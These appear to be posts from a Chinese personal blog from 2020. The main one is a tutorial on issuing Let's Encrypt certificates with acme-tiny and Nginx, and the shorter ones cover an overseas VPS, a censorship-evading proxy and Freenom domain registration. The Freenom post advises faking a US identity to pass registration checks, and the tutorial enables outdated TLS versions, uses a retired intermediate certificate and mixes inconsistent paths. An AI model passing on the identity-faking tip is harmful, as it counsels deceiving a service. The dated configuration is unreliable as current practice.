HTTP 服务，以 Nginx 为例\npython\n两个目录:\n/site\t网站目录\n/site_site_cert\t保存证书的目录\n证书的颁发有两种方式：\n通过在线生成 通过网址在线生成，需要验证文件\n通过程序生成 通过本地 IIS，生成后会自动绑定本地 IIS 站点上的HTTPS 域名。\n我使用的是第一种方法：在线生成，原理是：先在你的服务器上传一个密钥，然后Let\u0026rsquo;s Encrypt会对网站进行访问，下载密钥进行验证。\n开工 创建账号 首先创建一个目录，我是在根目录下创建文件夹site_cert\n1 mkdir /site_cert 这个文件夹用来存放各种临时文件和最后的证书文件。进入这个目录，创建一个RSA私钥，用于Let\u0026rsquo;s Encrypt识别你的身份\n1 openssl genrsa 4096 \u0026gt; account.key 创建CSR文件 在这之前，还需要创建域名私钥（一定不要使用上面的账户私钥）\n1 openssl genrsa 4096 \u0026gt; domain.key 我参考的文章提到了两种私钥RSA和ECC，我现在也还不懂什么原理，把两种区别放出来吧\nRSA 私钥：兼容性好\nECC 私钥：部分老旧操作系统、浏览器不支持。优点是证书体积小\n两个用于身份身份验证的私钥文件创建好，就可以生成CSR（Certificate Signing Request，证书签名请求）文件了，申请时可以把域名带 www 和不带 www 的两种情况都加进去，一张证书最多可以包含100个域名。\n1 openssl req -new -sha256 -key domain.key -subj \u0026#34;/\u0026#34; -reqexts SAN -config \u0026lt;(cat /etc/ssl/openssl.cnf \u0026lt;(printf \u0026#34;[SAN]\\nsubjectAltName=DNS:yoursite.com,DNS:www.yoursite.com\u0026#34;)) \u0026gt; domain.csr 其中DNS的yoursite.com和www.yoursite.com记得要换成自己的域名 我在这里遇到了问题提示找不到/etc/ssl/openssl.cnf文件，在网上找的的解决办法是\n执行 :\n1 openssl version -a 会输出openssl的信息，其中OPENSSLDIR对应的路径就是openssl.cnf文件的地址，自行将上面的cat /etc/ssl/openssl.cnf,改为自己的路径运行。\n配置验证服务 前面介绍过了Let\u0026rsquo;s Encrypt验证的原理是在你的服务器上生成一个随机文件，在通过创建CSR时的域名进行访问下载，如果成功表明你对这个域名的拥有权。\n创建用于存放网站的目录site以及用于验证文件存放的子目录\n1 mkdir -p /site/.well-known/acme-challenge/ 然后再Nginx中配置:\n1 2 3 4 5 6 7 8 9 10 11 12 server { server_name www.yoursite.com yoursite.com; location ^~ /.well-known/acme-challenge/ { alias /home/xxx/www/challenges/; try_files $uri =404; } location / { rewrite ^/(.*)$ https://yoursite.com/$1 permanent; } } 别忘了改yoursite 这个配置会优先查找/site目录下的网站，建议保留以后证书认证还可以用到，因为颁发的证书一次可以使用90天。\n获取网站证书 先下载acme-tiny脚本到之前的site_cert目录：\n1 wget https://raw.githubusercontent.com/diafygi/acme-tiny/master/acme_tiny.py 指定账户私钥、CSR以及网站上验证文件的目录，执行脚本:\n1 python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /fakesite/.well-known/acme-challenge/ \u0026gt; ./signed.crt 执行成功的话会在当前目录生成一个signed.crt文件，这个文件就是申请好的证书文件。\n我在这里出现了错误提示\n1 ValueError: Wrote file to /site/.well-known/acme-challenge/blablabla, but couldn\u0026#39;t download http://www.yoursite.com/.well-known/acme-challenge/blablabla 大概的意思就是，在网站目录里写入了一个验证文件，但是Let\u0026rsquo;s Encrypt的服务器访问不到你的网站，建议先去看一看Nginx配置是否出错，再有可能是自己的域名无法在国外解析，建议暂时使用国外的DNS解析商。推荐的有：\nHurricane Electric Free DNS\nZoneEdit\nCloudFlare\n这些都是免费的，但是因为我自己的域名后缀为.tk，上面第一个DNS解析商警告因为.tk域名滥用，不给解析。\n网站证书到手以后，还要下载 Let\u0026rsquo;s Encrypt 的中间证书。证书链中大部分都是「站点证书 – 中间证书 – 根证书」这样三级。服务端只需要发送前两个证书即可。我们需要把中间证书和网站证书合在一起：\n1 2 3 4 wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem \u0026gt; intermediate.pem cat signed.crt intermediate.pem \u0026gt; chained.pem 最终，在Nginx中添加证书配置，并reload，我的部分配置如下\n1 2 3 4 5 6 7 8 9 10 11 server { listen 443 ssl; ssl_certificate /site_cert/chained.pem; ssl_certificate_key /site_cert/domain.key; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers HIGH:!aNULL:!MD5; server_name braindance.tk; index index.html index.htm; root ………………………… } 执行\n1 nginx -s reload 证书自动更新 计划任务 ​\t至此我们已经成功的获取到了Https证书，但是获取到的Https证书只有90天的时效，到期的话还需要使用相同的方法进行更新，为了避免某次忘记更新导致网站出现问题，我们可以使用linux中的crond服务为我们自动更新证书。\n用 vi 在 /site_cert 文件夹 创建 计划任务脚本 renew_cert.sh\n1 vi /site_cert/renew_cert.sh 通过vi输入以下内容\n1 2 3 4 5 6 7 #!/bin/bash cd /fakesite_cert/ python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /fakesite/.well-known/acme-challenge/ \u0026gt; ./signed.crt || exit wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem \u0026gt; intermediate.pem cat signed.crt intermediate.pem \u0026gt; chained.pem nginx -s reload 更新的大致过程是，运行python脚本再次更新signed.crt申请证书文件，再进行证书合并写入chained.pem文件。\n然后给这个文件赋予 可执行 属性\n1 chmod +x /fakesite_cert/renew_cert.sh 使用crontab -e指令打开定时任务配置文件，并加入以下内容。\n1 0 0 1 * * /home/xxx/shell/renew_cert.sh \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 对于上面指令的具体意思请自行搜索crontab命令\n完工 ","date":"2020-09-03T15:30:37Z","permalink":"https://www.braindance.top/articles/2020/09/let_s_encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/","title":"Let_s_Encrypt 免费Https证书"},{"content":"​\t服务器到手了肯定不能闲着，既然有了国外的服务器，第一个想法就是去整一个魔法，我姐也因为网络问题，经常让我帮忙下载国外的资料，这次整一个就能让我姐自己用了。\n​\t还是出于会被Qang的顾虑，自己对于这方面的知识也很少，普通的建设方法据说已经会被主动嗅探等给检测到，于是就花了很久找伪装的方法，结果在github上找到了一个项目，使用的技术大概就是反向代理+Https的协议，这里就不细讲了主要是害怕，可以自己到项目去看看。\n​\t在这里还学会了搞Let\u0026rsquo;s Encrypt的SSL证书，主要是用来保证数据的加密传输，也就是Https协议，后面开一篇申请证书的过程文章，照着参阅的文章也踩了不少坑。\n","date":"2020-09-02T22:05:34Z","permalink":"https://www.braindance.top/articles/2020/09/%E6%90%AD%E7%AA%9D%E8%BF%87%E7%A8%8B%E4%BA%8C/","title":"搭窝过程(二)"},{"content":"1.官网 Freenom - 人人都熟悉的名字\n官网右上角可以切换中文，简直了。\n然后觉得我讲的有点啰嗦的还可以看油管上的freenom教学视频\n2.搜索想要的域名 ​\t搜索以后会列出来可以选择的域名列表，上面的是免费域名，下面的则是一些付费域名。\n​\t我在这里还遇到了一个坑提前说。freenom提供的有自己的域名解析服务，国内也可以访问的到，我遇到了一个问题有回答说换个DNS解析就行，推荐的是Hurricane Electric Hosted DNS，但这个网站禁止了.tk域名的解析。类似的问题请自行先考虑\n接下来选中域名以后点击Get it now！以后只是添加到购物车，随后点击界面中的Checkout跳转到结算界面，这里只用选择期限即可。\n点击continue按钮会提示注册，这里又有坑。\n由于蝗虫一般涌入试图薅羊毛的中国人让 freenom 极度不爽, freenom 的免费域名注册对中国人并不友好, 极大概率注册会失败. 为了顺利注册免费域名, 请首先用美国 IP 翻着墙, 使用 Google 账号直接登录该站, 不必自主注册账号, 在填写个人资料时, 用 fakenamegenerator.com 胡诌个美国住址, 就可以随意注册免费域名了.\n3.域名解析 ​\t完成以后点击Services\u0026ndash;\u0026gt;My Domains进入域名管理页面。\n点击域名后面的Manage Domain进入域名解析\n​\tNameservers就是域名解析服务器进入后两个选项，第一个是使用freenom的域名解析服务器，第二个是使用其他域名解析商的服务器。\n之后点击Manage Freenom DNS进行域名解析就可以使用注册的域名访问了，示例：\n","date":"2020-09-02T12:25:37Z","permalink":"https://www.braindance.top/articles/2020/09/freenom%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E8%A7%A3%E6%9E%90%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/","title":"Freenom域名注册解析到服务器"},{"content":" 备案劝退 很早就有想搭博客的想法了，起初在阿里云上用宝塔面板搭建过一个，觉得IP访问太暴露了就想去备案，结果阿里云的备案过程真的是把我给整吐了，大概流程就是：填网站信息\u0026raquo;\u0026gt;阿里云审核通过\u0026raquo;\u0026gt;工信部审核。看似个简单的过程，我在阿里云审核那就被劝退了，官方小改改先是跟我说填写信息不能有什么什么字眼，很耐心的帮我改了改，然后让我提供钉钉号，说一会会有官方加我好友跟我视频认证，这对于稍微有点自闭的我来说有点难顶，但想都到这步了硬着头皮来吧。等了一个多小时，我看到邮箱里有封邮件说我拒绝视频认证，审核失败，我tm直接当场？？？看了看钉钉申请和审核失败的邮件，之间就相差了2分钟。\n选择服务器 听说了备案的依据是服务器的地理位置，想到去买国外的服务器，在知乎、谷歌上搜了一大堆国外的服务商，大致推荐的都是：vultr、搬瓦工、blablablabal，看到价格和配置都特别心动，但是都是很久之前的信息，现在已经变贵了，最后挑了一个现在最便宜的pacificrack,看评价说便宜的原因就是超售，而且服务商有可能跑路balbabla的，我现在就心想体验一番管他呢，最后买的配置1cpu 1G 20GB 100Mbps一年$12，觉得比阿里云那个学生云香，最重要的是不用备案！！！！\n域名注册 服务器到手以后，又听说什么国外的服务器有可能会被Qang，我也尽量少选国内提供的服务，随后找到了国外免费的域名注册商freenom，注册了域名braindanc.tk，把域名解析到自己的服务器，后面补一篇注册的过程吧。\n到这服务器和域名都搞定了。\n","date":"2020-09-02T11:14:35Z","permalink":"https://www.braindance.top/articles/2020/09/%E9%80%A0%E7%AA%9D%E8%BF%87%E7%A8%8B%E4%B8%80/","title":"造窝过程(一)"},{"content":"第一篇文章的内容\n刚把博客搭成，然后看了看markdown的语法，以后慢慢往上面加吧。\n","date":"2020-08-26T16:40:03Z","permalink":"https://www.braindance.top/articles/2020/08/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/","title":"第一篇文章"}]